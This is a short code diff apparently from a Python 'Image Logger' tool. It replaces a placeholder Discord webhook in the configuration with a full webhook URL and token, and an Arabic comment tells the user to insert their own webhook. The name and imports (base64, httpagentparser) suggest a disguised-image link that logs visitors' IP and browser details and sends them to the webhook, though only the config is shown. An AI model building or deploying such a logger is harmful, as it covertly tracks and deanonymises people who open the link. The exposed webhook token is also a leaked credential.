@@ -4,7 +4,7 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/xxxxxxxxx/xxxxxxxx",  # حط Webhook حقك هنا
+    "webhook": "https://discord.com/api/webhooks/1367472785269723156/fnoDewO4dijhgOjBIfLnS48CBem5qZ1FiIa85UPmVuATznoPcq2vhsQdBK2PgnMBHbiW",  # حط Webhook حقك هنا
     "image": "https://images.sftcdn.net/images/t_app-cover-m,f_auto/p/9848e854-ffae-11e6-a59d-00163ed833e7/3489861693/discord-screenshot.png",
     "username": "Image Logger",
     "color": 0x00FFFF,
